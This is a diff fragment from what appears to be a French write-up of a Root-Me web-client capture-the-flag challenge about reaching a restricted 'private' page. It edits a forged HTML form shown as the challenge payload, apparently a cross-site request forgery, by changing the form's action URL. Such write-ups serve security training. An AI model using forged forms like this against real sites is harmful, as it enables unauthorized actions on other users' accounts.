@@ -126,7 +126,7 @@ Le but du challenge est d'acceder à la page private qui est seulement disponibl
 ### Payload :
 
 ```
-<form name="profileForm" id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=private" method="post" enctype="multipart/form-data">
+<form name="profileForm" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
 			<div>
 			<label>Username:</label>
 			<input id="username" type="text" name="username" value="l.mak">
